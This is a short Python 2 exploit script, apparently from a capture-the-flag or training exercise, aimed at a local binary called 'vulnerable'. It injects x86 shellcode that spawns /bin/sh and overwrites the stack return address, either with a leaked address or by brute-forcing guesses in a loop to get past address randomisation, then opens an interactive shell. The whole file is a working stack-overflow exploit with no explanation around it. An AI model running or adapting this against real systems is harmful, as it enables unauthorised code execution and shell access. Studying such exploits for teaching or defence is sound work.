#!/usr/bin/env python
# encoding:utf-8

import zio
import os

distance = 0x88 + 4
shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"
junk = "A" * (distance - len(shellcode))

def normal():
    global distance
    global shellcode
    global junk
    Io = zio.zio("./vulnerable")
    line = Io.readline() # 接受到的数据为 : What's this:0xffe36e40?
    address_number = int(line[len("What's this:"):-2], 16) # 程序运行之后才可以得到
    address = zio.l32(address_number)
    print "[address] : [%s]" % (hex(address_number)[0:-1])
    payload = shellcode + junk + address
    Io.write(payload)
    Io.interact()


def brute(address_number):
    global distance
    global shellcode
    global junk
    Io = zio.zio("./vulnerable")
    address_real = int(Io.readline()[len("What's this:"):-2], 16) # 程序运行之后才可以得到
    print "[Real] : [%s]" % (hex(address_real)[0:-1])
    address = zio.l32(address_number)
    payload = shellcode + junk + address
    Io.write(payload)
    Io.interact()

def bruter():
    counter = 0
    MAX = 0xffff
    address = 0xbfc61ba0
    while True:
        os.system("clear")
        print "[Time] : [%d]" % (counter)
        print "[Guess] : [0x%8x]" % (address)
        counter += 1
        if brute(address):
            break
        if counter > MAX:
            break

def main():
    # normal()
    bruter()

if __name__ == "__main__":
    main()
